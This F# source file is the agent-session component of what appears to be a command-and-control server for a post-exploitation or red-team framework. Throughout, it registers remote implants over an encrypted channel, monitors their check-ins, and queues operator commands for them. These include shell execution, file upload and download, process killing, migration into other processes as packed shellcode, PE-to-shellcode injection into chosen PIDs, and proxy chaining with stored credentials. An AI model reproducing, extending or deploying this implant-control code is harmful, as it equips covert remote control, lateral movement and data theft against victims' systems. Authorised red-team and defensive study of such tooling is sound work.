namespace ES.Alan.Core

open System
open System.IO
open System.Linq
open System.Collections.Generic
open System.Text
open System.Reflection
open Newtonsoft.Json
open ES.Alan.Core.Entities
open ES.Fslog
open Org.BouncyCastle.Crypto.Parameters
open Newtonsoft.Json.Linq

type AgentSession(rawPrivateKey: Byte array, inputSettings: AgentSettings, messageBroker: MessageBroker, logProvider: ILogProvider) as this =    
    let mutable _sessionKey: Byte array option = None
    let mutable _registeredAgent: Agent option = None
    let mutable _agentPublicKey = Array.empty<Byte>    
    let mutable _runToCompletation = false
    let mutable _jsEngineLoaded = false
    let mutable _commandId = 0
    let _settings = AgentSettings.Read(inputSettings.ToJson())    
    
    let _commandLock = new Object()
    let _userCommands = new Queue<AgentCommand>()
    let _pendingCommands = new Dictionary<Int32, AgentCommand>()
    let _dataFormatter = new DataFormatter()

    let _logger =
        log "AgentSession"              
        |> error "Exception" "{0}"
        |> warning "Unresponsive" "{0} seconds elapsed (sleep time: {1}s) since the last time that the agent 0x{2} connected."
        |> info "BackOnline" "Agent 0x{0} is back online."
        |> info "ProxyUsed" "Using proxy: {0}"
        |> info "ProxyStopped" "Stopped proxy: {0}"
        |> info "ProxyChainStopped" "Remove chain for proxy: {0}"
        |> info "ProxyClosed" "Closed proxy: {0}"
        |> info "ProxyChained" "Proxy {0} was chained to {1}"
        |> buildAndAdd logProvider

    let getNextCommandId() =
        _commandId <- _commandId + 1
        _commandId

    let expectResponse(commandType: AgentCommandType) = 
        [
            AgentCommandType.Registration
            AgentCommandType.GetSystemInfo
            AgentCommandType.GetExtendedSystemInfo
            AgentCommandType.RunShellCommand
            AgentCommandType.GetConfig
            AgentCommandType.Migrate
            AgentCommandType.GetProcessList
            AgentCommandType.DownloadFiles
            AgentCommandType.UploadFiles
            AgentCommandType.RunProgram
            AgentCommandType.ExecCommand
            AgentCommandType.KillProcess
            AgentCommandType.ProxyUse
            AgentCommandType.ProxyClose
            AgentCommandType.ProxyStop
            AgentCommandType.CreateProxyChain
            AgentCommandType.StopProxyChain
            AgentCommandType.ProxyInfo
        ]
        |> List.contains commandType

    let runAgentHealthMonitor() = Async.StartAsTask <| async {
        let mutable unresponsive = false
        while not _runToCompletation do
            do! Async.Sleep (_settings.Session.Sleep)
            _registeredAgent
            |> Option.iter(fun agent ->
                let elapsedTime = int32 (DateTime.Now - agent.LastConnected).TotalMilliseconds
                if elapsedTime > (_settings.Session.Sleep * 5)  then
                    if not unresponsive then
                        _logger?Unresponsive(int32 <| elapsedTime / 1000, int32 <| _settings.Session.Sleep / 1000, agent.Id.ToString("X"))
                    unresponsive <- true
                elif unresponsive then
                    _logger?BackOnline(agent.Id.ToString("X")) 
                    unresponsive <- false
            )            
    }     

    let sendCommandsToAgent() =
        lock _commandLock (fun () ->
            if _userCommands.Count = 0 then
                // user didn't insert any command to execute
                let data = Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N"))
                [|Packet.Create(data, 0, AgentCommandType.NoCommand)|]
            else
                [|
                    while(_userCommands.Count > 0) do
                        let command = _userCommands.Dequeue()
                        if command.ExpectResponse then
                            _pendingCommands.[command.Id] <- command
                        let packet = Packet.Create(command.Data, command.Id, command.Type)
                        yield packet
                |]
        )

    let registAgent(data: Byte array, requestMessage: AgentMessage) =        
        let agentInfoStr = Encoding.UTF8.GetString(data)
        if not <| String.IsNullOrWhiteSpace(agentInfoStr) then
            let agentInfo = JsonConvert.DeserializeObject<{|Version: String; Pid: Int32; Bitness: String|}>(agentInfoStr)   
        
            // send the agent registered message            
            match _registeredAgent with
            | None ->
                let agentId = uint32 <| _settings.PublicKey.GetHashCode()
                _registeredAgent <- Some <| {                    
                    Id = agentId
                    ProcessId = agentInfo.Pid
                    SessionId = requestMessage.SessionId
                    Bitness = CpuBitness.FromString(agentInfo.Bitness)
                    StartTime = DateTime.Now
                    LastConnected = DateTime.Now
                    Address = requestMessage.AgentAddress
                    Port = requestMessage.AgentPort
                    EntryPoint = requestMessage.EntryPoint
                    Settings = _settings
                    Version = agentInfo.Version
                    ListenerType = requestMessage.ListenerType
                    Proxy = None
                }
                messageBroker.Dispatch(this, new NewAgentRegisteredMessage(_registeredAgent.Value))   
            | _ ->()
        Packet.CreateNoData(0, AgentCommandType.NoCommand)

    let createRegistrationPacket() =
        let command = {
            Id = getNextCommandId()
            Type = AgentCommandType.Registration
            Data = Encoding.UTF8.GetBytes(_settings.ToJson())
            ExpectResponse = expectResponse(AgentCommandType.Registration)
            Context = None
        }     
        Packet.Create(command.Data, command.Id, command.Type)

    let manageRegistration(requestMessage: AgentMessage) =
        if requestMessage.Packets.Length > 0 then  
            requestMessage.Packets
            |> Array.map(fun packet ->
                match packet.Type with
                | RequestType.CommandData ->
                    registAgent(packet.Data, requestMessage)
                | _ ->
                    createRegistrationPacket()
            )
            // we expect only one packet during registration
            |> Array.head
        else
            // send full configuration to agent
            createRegistrationPacket()
            
    let handleCommandResult(packet: Packet<'T>) =
        // sanity check
        if packet.State = PacketState.NoMorePackets then   
            // since the command is completed, remove the ID
            match _pendingCommands.TryGetValue(packet.Id) with
            | (true, command) -> 
                if command.Type = AgentCommandType.Migrate then
                    let data = JsonConvert.DeserializeObject<{|Pid: Int32|}>(Encoding.UTF8.GetString(command.Data))
                    _registeredAgent <- Some({_registeredAgent.Value with ProcessId = data.Pid})
                _pendingCommands.Remove(packet.Id) |> ignore
            | _ -> ()

            let data = Encoding.UTF8.GetString(packet.Data)
            let response = JsonConvert.DeserializeObject<{|Error: UInt32; Data: String|}>(data)
            messageBroker.Dispatch(this, new AgentCommandCompletedMessage(_registeredAgent.Value, packet.Id, response.Error, response.Data))

        [|Packet.CreateNoData(0, AgentCommandType.NoCommand)|]    

    let handleCommandData(packet: Packet<'T>) =
        if packet.Data.Length > 0 then
            let command =
                match _pendingCommands.TryGetValue(packet.Id) with
                | (true, command) -> command
                | _ -> AgentCommand.NoCommand(packet.Id)                
            let message = new AgentCommandDataMessage(_registeredAgent.Value, command.Type, packet.Data, command)
            messageBroker.Dispatch(this, message)

        [|Packet.CreateNoData(0, AgentCommandType.NoCommand)|]    
        
    let sendIPAddress(requestMessage: AgentMessage) =        
        Packet.Create(Encoding.UTF8.GetBytes(requestMessage.AgentAddress), 0, AgentCommandType.PublicIP)
        
    let createRegistrationPackets(requestMessage: AgentMessage) = [|
        manageRegistration(requestMessage)
        sendIPAddress(requestMessage)
    |]

    let processAgentMessage(requestMessage: AgentMessage): Packet<AgentCommandType> array =
        match _registeredAgent with
        | None ->
            // agent must first regist in order to receive commands
            createRegistrationPackets(requestMessage)
        | _ ->
            if requestMessage.Packets |> Array.isEmpty then
                // no work done from agent, send commands if available
                sendCommandsToAgent()
            else
                // received data from agent, process them
                requestMessage.Packets
                |> Array.map(fun packet ->
                    match packet.Type with                    
                    | RequestType.AskForCommand -> sendCommandsToAgent()                        
                    | RequestType.CommandData -> handleCommandData(packet)
                    | RequestType.CommandResult -> handleCommandResult(packet)
                    | RequestType.RegistAgent -> createRegistrationPackets(requestMessage)
                    | _ -> [|Packet.CreateNoData(0, AgentCommandType.NoCommand)|]
                )    
                |> Array.concat    

    let processRequestMessage(listener: IListener) (agentMessage: AgentMessage) =
        let serverPackets = processAgentMessage(agentMessage)        
        let serializedResponse = _dataFormatter.Serialize(serverPackets)     
        let encodedResponse = _dataFormatter.Encode(serializedResponse, _registeredAgent.IsSome)        
        Ok encodedResponse

    let getSystemInfoMessageHandler(sender: Object, message: Envelope<GetSystemInfoMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.GetSystemInfo
                    Data = Array.empty
                    ExpectResponse = expectResponse(AgentCommandType.GetSystemInfo)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let getExtendedSystemInfoMessageHandler(sender: Object, message: Envelope<GetExtendedSystemInfoMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.GetExtendedSystemInfo
                    Data = Array.empty
                    ExpectResponse = expectResponse(AgentCommandType.GetExtendedSystemInfo)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let exitAgentMessageHandler(sender: Object, message: Envelope<ExitAgentMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.TerminateAgent
                    Data = Array.empty
                    ExpectResponse = expectResponse(AgentCommandType.TerminateAgent)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
                _runToCompletation <- true  
        )              

    let executeShellCommandMessageHandler(sender: Object, message: Envelope<ExecuteShellCommandMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.RunShellCommand
                    Data = Encoding.UTF8.GetBytes(message.Item.Data)
                    ExpectResponse = expectResponse(AgentCommandType.RunShellCommand)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let terminateCommandShellMessageHandler(sender: Object, message: Envelope<TerminateShellMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.TerminateShell
                    Data = Array.empty
                    ExpectResponse = expectResponse(AgentCommandType.TerminateShell)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let getConnectedAgentsMessageHandler(sender: Object, message: Envelope<GetConnectedAgentsMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            message.Item.Agents.Add(agent)
        )        

    let updateConfigMessageHandler(sender: Object, message: Envelope<UpdateConfigMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then 
                _settings.Load(message.Item.Settings)
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.UpdateConfig
                    Data = Encoding.UTF8.GetBytes(message.Item.Settings)
                    ExpectResponse = expectResponse(AgentCommandType.UpdateConfig)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let getConfigMessageHandler(sender: Object, message: Envelope<GetConfigMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.GetConfig
                    Data = Array.empty<Byte>
                    ExpectResponse = expectResponse(AgentCommandType.GetConfig)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let migrateAgentMessageHandler(sender: Object, message: Envelope<MigrateAgentMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                // add an empty agent settings. This settings will be overwritten with the
                // actual agent settings before the migration
                let agentSettings = Encoding.UTF8.GetBytes((new AgentSettings()).ToMinimalJson())
                let configuredAgentContent = Utility.addConfigToAgentFile(message.Item.BaseArtifact, agentSettings)
                let packer = new ArtifactPacker(message.Item.PackerSettings)
                let shellcode = packer.PackPe(configuredAgentContent, Packaging.Shellcode) |> Convert.ToBase64String

                let data = 
                    {|Shellcode = shellcode; Pid = message.Item.ProcessId|}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.Migrate
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.Migrate)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let getProcessListMessageHandler(sender: Object, message: Envelope<GetProcessListMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.GetProcessList
                    Data = Array.empty<Byte>
                    ExpectResponse = expectResponse(AgentCommandType.GetProcessList)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let downloadFileMessageHandler(sender: Object, message: Envelope<DownloadFileMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then             
                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.DownloadFiles
                    Data = Encoding.UTF8.GetBytes(message.Item.FileName)
                    ExpectResponse = expectResponse(AgentCommandType.DownloadFiles)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let agentSleepMessageHandler(sender: Object, message: Envelope<AgentSleepMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            try
                if agent.Id = message.Item.AgentId then    
                    let command: AgentCommand = {
                        Id = getNextCommandId()
                        Type = AgentCommandType.AgentSleep
                        Data =
                            {|Sleep = message.Item.Timeout; Jitter = message.Item.Jitter|}
                            |> JsonConvert.SerializeObject
                            |> Encoding.UTF8.GetBytes
                        ExpectResponse = expectResponse(AgentCommandType.AgentSleep)
                        Context = None
                    }
                    _userCommands.Enqueue(command)
            with e ->
                _logger?Exception(e)
        )

    let uploadFileMessageHandler(sender: Object, message: Envelope<UploadFileMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            try
                if agent.Id = message.Item.AgentId then
                    let files =
                        message.Item.Files
                        |> Array.map(fun file ->
                            let rootPath = 
                                if Directory.Exists(message.Item.RootPath) then message.Item.RootPath
                                else Path.GetDirectoryName(message.Item.RootPath)

                            let effectiveName = 
                                file
                                    .Replace(rootPath, String.Empty)
                                    .TrimStart(Path.DirectorySeparatorChar)
                            {|
                                Name = effectiveName
                                Content = 
                                    file 
                                    |> File.ReadAllBytes 
                                    |> Convert.ToBase64String
                            |}
                        )
                    let data = {|Destination = message.Item.DestinationDirectory; Files = files|}
                    let payload = JsonConvert.SerializeObject(data)
                    let command: AgentCommand = {
                        Id = getNextCommandId()
                        Type = AgentCommandType.UploadFiles
                        Data = Encoding.UTF8.GetBytes(payload)
                        ExpectResponse = expectResponse(AgentCommandType.UploadFiles)
                        Context = Some(message.Item :> Object)
                    }
                    _userCommands.Enqueue(command)
            with e ->
                _logger?Exception(e)
        )

    let run(runMsg: RunMessage) =
        let packer = new ArtifactPacker(runMsg.PackerSettings)        
        let consoleInterceptor = 
            if runMsg.Interceptor.Length > 0 
            then packer.PackPe(runMsg.Interceptor, Packaging.Shellcode)
            else Array.empty
        
        let mainShellcodeInjectedPe =
            if runMsg.FileContent.[0] = byte 'M' && runMsg.FileContent.[1] = byte 'Z' then
                packer.PackPe(runMsg.FileContent, Packaging.Shellcode, runMsg.Arguments)
            else
                // it is a shellcode nothing to add
                runMsg.FileContent
        
        // finally create and enqueue the inject message. 
        // Use the same property names of the inject command to easier its task
        let data = 
            {|
                Interceptor = consoleInterceptor
                Main = mainShellcodeInjectedPe 
                Pid = runMsg.ProcessId
                Bitness = runMsg.Bitness.ToString()
                NoOut = runMsg.RunInBackground
            |}
            |> Utility.jsonSerialize
            |> Encoding.UTF8.GetBytes
        
        let command: AgentCommand = {
            Id = getNextCommandId()
            Type = AgentCommandType.RunProgram
            Data = data
            ExpectResponse = expectResponse(AgentCommandType.RunProgram)
            Context = Some(runMsg :> Object)
        }
        _userCommands.Enqueue(command)

    let runMessageHandler(sender: Object, message: Envelope<RunMessage>) =        
        _registeredAgent
        |> Option.iter(fun agent ->
            try
                if agent.Id = message.Item.AgentId then
                    run(message.Item)
            with e ->
                _logger?Exception(e)
        )

    let commandExecProgramMessageHandler(sender: Object, message: Envelope<ExecProgramMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let data = 
                    {|
                        Command = message.Item.Command 
                        Shell = message.Item.UseShell
                        NoOut = message.Item.RunInBackground
                    |}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.ExecCommand
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.ExecCommand)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let commandProcessKillMessageHandler(sender: Object, message: Envelope<ProcessKillMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let data = 
                    {|  Pid = message.Item.Pid |}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.KillProcess
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.KillProcess)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let agentResultDataMessageHandler(sender: Object, message: Envelope<AgentCommandDataMessage>) =   
        _registeredAgent
        |> Option.iter(fun agent ->
            match message.Item.CommandType with
            | AgentCommandType.ProxyInfo ->
                let data = Encoding.Default.GetString(message.Item.Data).Trim()
                let proxyInfo =  JsonConvert.DeserializeObject(data) :?> JObject

                let getDefaultString(name: String) =
                    match JsonHelper.get(proxyInfo, name) with
                    | Some j -> j.ToString()
                    | None -> String.Empty

                // extract proxy information
                let address = getDefaultString "address"
                let port = getDefaultString "port"
                let username = getDefaultString "username"
                let password = getDefaultString "password"

                let proxyOpt = new TryGetProxyMessage(address, port.ToString(), username, password)
                messageBroker.DispatchAndWaitHandling(this, proxyOpt)
                match proxyOpt.Proxy with
                | None ->
                    // add the proxy to the list
                    let newProxyMessage = 
                        new NewProxyMessage(
                            agent.Id, 
                            address, 
                            port, 
                            username, 
                            password
                        )
                    messageBroker.Dispatch(this, newProxyMessage)
                | Some proxy ->
                    let updatedProxy = 
                        {proxy with
                            Address = address
                            Port = Utility.int32Parse(port, 0)
                            Username = username
                            Password = password
                        }
                    let updatedProxyMessage = new UpdateProxyMessage(agent.Id, updatedProxy)
                    messageBroker.Dispatch(this, updatedProxyMessage)
            | _ ->
                ()
        )        

    let rec useProxyMessageHandler(sender: Object, message: Envelope<UseProxyMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                _registeredAgent <- Some {agent with Proxy = Some message.Item.Proxy}       
                                       
                // send the command to the agent
                let data = 
                    {|  
                        Address = message.Item.Proxy.Address
                        Port = message.Item.Proxy.Port
                        Username = message.Item.Proxy.Username
                        Password = message.Item.Proxy.Password
                    |}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.ProxyUse
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.ProxyUse)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
                _logger?ProxyUsed(message.Item.Proxy.GetFullAddress())
        )

    let closeProxyMessageHandler(sender: Object, message: Envelope<CloseProxyMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                _registeredAgent <- Some {agent with Proxy = None} 

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.ProxyClose
                    Data = Array.empty
                    ExpectResponse = expectResponse(AgentCommandType.ProxyClose)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
                _logger?ProxyClosed(message.Item.Proxy.GetFullAddress())
        )
                
    let infoProxyMessageHandler(sender: Object, message: Envelope<InfoProxyMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                let data = 
                    {| Port = message.Item.Port.ToString() |}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.ProxyInfo
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.ProxyInfo)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
        )

    let stopProxyMessageHandler(sender: Object, message: Envelope<StopProxyMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                // close the proxy if it is the agent one
                agent.Proxy
                |> Option.iter(fun proxy ->
                    if proxy.Id = message.Item.Proxy.Id then
                        _registeredAgent <- Some {agent with Proxy = None} 
                )

                // send the agent command
                let data = 
                    {| Port = message.Item.Proxy.Port.ToString() |}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.ProxyStop
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.ProxyStop)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)

                // send the message to update the DB
                let deleteProxyMsg = new DeleteProxyMessage(agent.Id, message.Item.Proxy.Id)
                messageBroker.Dispatch(this, deleteProxyMsg)
                _logger?ProxyStopped(message.Item.Proxy.GetFullAddress())
        )

    let createChainProxyMessageHandler(sender: Object, message: Envelope<CreateChainProxyMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                // send the agent command
                let data = 
                    {| 
                        Port = message.Item.SrcProxy.Port.ToString() 
                        ProxyAddress = message.Item.DestProxy.Address
                        ProxyPort = message.Item.DestProxy.Port.ToString() 
                        ProxyUsername = message.Item.DestProxy.Username
                        ProxyPassword = message.Item.DestProxy.Password
                    |}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.CreateProxyChain
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.CreateProxyChain)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)
                _logger?ProxyChained(message.Item.SrcProxy.GetFullAddress(), message.Item.DestProxy.GetFullAddress())
        )

    let stopChainProxyMessageHandler(sender: Object, message: Envelope<StopChainProxyMessage>) =
        _registeredAgent
        |> Option.iter(fun agent ->
            if agent.Id = message.Item.AgentId then
                

                // send the agent command
                let data =
                    {| Port = message.Item.Proxy.Port.ToString() |}
                    |> Utility.jsonSerialize
                    |> Encoding.UTF8.GetBytes

                let command: AgentCommand = {
                    Id = getNextCommandId()
                    Type = AgentCommandType.StopProxyChain
                    Data = data
                    ExpectResponse = expectResponse(AgentCommandType.StopProxyChain)
                    Context = Some(message.Item :> Object)
                }
                _userCommands.Enqueue(command)

                // send the message to update the DB
                let updatedProxy = {message.Item.Proxy with Chain = None}
                let deleteProxyMsg = new UpdateProxyMessage(agent.Id, updatedProxy)
                messageBroker.Dispatch(this, deleteProxyMsg)
                _logger?ProxyChainStopped(message.Item.Proxy.GetFullAddress())
        )

    let updateAgentInfo(listenerType: ListenerType, entryPoint: String, address: String, port: Int32) =
        _registeredAgent
        |> Option.iter(fun agent ->
            _registeredAgent <-                 
                {agent with 
                    Address = address
                    Port = port
                    LastConnected = DateTime.Now
                    ListenerType = listenerType
                    EntryPoint = entryPoint
                }
                |> Some
        )

    let initSession(agentPublicKey: Byte array) =
        match _sessionKey with
        | Some sessionKey when Enumerable.SequenceEqual(agentPublicKey, _agentPublicKey) -> ()
        | _ ->
            _agentPublicKey <- agentPublicKey
            _registeredAgent <- None
            _sessionKey <- Some <| Array.zeroCreate<Byte>(32)            
            let agentX25519PubKey = new X25519PublicKeyParameters(agentPublicKey, 0)
            let privateKey = new X25519PrivateKeyParameters(rawPrivateKey, 0)
            privateKey.GenerateSecret(agentX25519PubKey, _sessionKey.Value, 0)
            _dataFormatter.Initialize(_sessionKey.Value)

    do
        messageBroker.Subscribe(this, exitAgentMessageHandler)
        messageBroker.Subscribe(this, executeShellCommandMessageHandler)
        messageBroker.Subscribe(this, terminateCommandShellMessageHandler)
        messageBroker.Subscribe(this, getConnectedAgentsMessageHandler)
        messageBroker.Subscribe(this, getSystemInfoMessageHandler)
        messageBroker.Subscribe(this, getExtendedSystemInfoMessageHandler)
        messageBroker.Subscribe(this, updateConfigMessageHandler)
        messageBroker.Subscribe(this, getConfigMessageHandler)
        messageBroker.Subscribe(this, migrateAgentMessageHandler)
        messageBroker.Subscribe(this, getProcessListMessageHandler)
        messageBroker.Subscribe(this, downloadFileMessageHandler)
        messageBroker.Subscribe(this, uploadFileMessageHandler)
        messageBroker.Subscribe(this, agentSleepMessageHandler)
        messageBroker.Subscribe(this, runMessageHandler)
        messageBroker.Subscribe(this, commandExecProgramMessageHandler)
        messageBroker.Subscribe(this, commandProcessKillMessageHandler)
        messageBroker.Subscribe(this, useProxyMessageHandler)
        messageBroker.Subscribe(this, closeProxyMessageHandler)
        messageBroker.Subscribe(this, stopProxyMessageHandler)
        messageBroker.Subscribe(this, createChainProxyMessageHandler)  
        messageBroker.Subscribe(this, stopChainProxyMessageHandler)
        messageBroker.Subscribe(this, infoProxyMessageHandler)
        messageBroker.Subscribe(this, agentResultDataMessageHandler)
        runAgentHealthMonitor() |> ignore

    member this.Id 
        with get() =
            match _registeredAgent with
            | Some agent -> agent.Id
            | None -> 0u

    member this.Handle
        (
        agentPubKey: Byte array, 
        sessionId: String, 
        entryPoint: String, 
        agentAddress: String, 
        agentPort: Int32, 
        inputRequest: Byte array,
        listener: IListener
        ) =
        
        let runToCompletation = _runToCompletation
        updateAgentInfo(listener.GetListenerType(), entryPoint, agentAddress, agentPort)
        initSession(agentPubKey)        

        _dataFormatter.Update(_settings, sessionId, entryPoint)
        let decodedData = _dataFormatter.Decode(inputRequest, listener, _registeredAgent.IsSome)

        // this update is needed for the encryption 
        let result =
            if _dataFormatter.IsDataValid(decodedData) then
                { 
                    SessionId = sessionId
                    SessionKey = _sessionKey.Value
                    EntryPoint = entryPoint
                    AgentAddress = agentAddress 
                    AgentPort = agentPort
                    ListenerType = listener.GetListenerType()
                    Packets =
                        if Array.isEmpty decodedData then Array.empty
                        else
                            let validatedData = decodedData |> Array.skip 32
                            _dataFormatter.Deserialize(validatedData)
                }
                |> processRequestMessage listener
            else
                Error ServerError.DataIntegrityFails

        if runToCompletation then
            _registeredAgent
            |> Option.iter(fun agent -> 
                messageBroker.Dispatch(this, new AgentTerminatedMessage(agent.Id))
            )            

        result

    member this.Dispose() =
        _registeredAgent <- None
        messageBroker.Unsubscribe(this)

    interface IDisposable with
        member this.Dispose() =
            this.Dispose()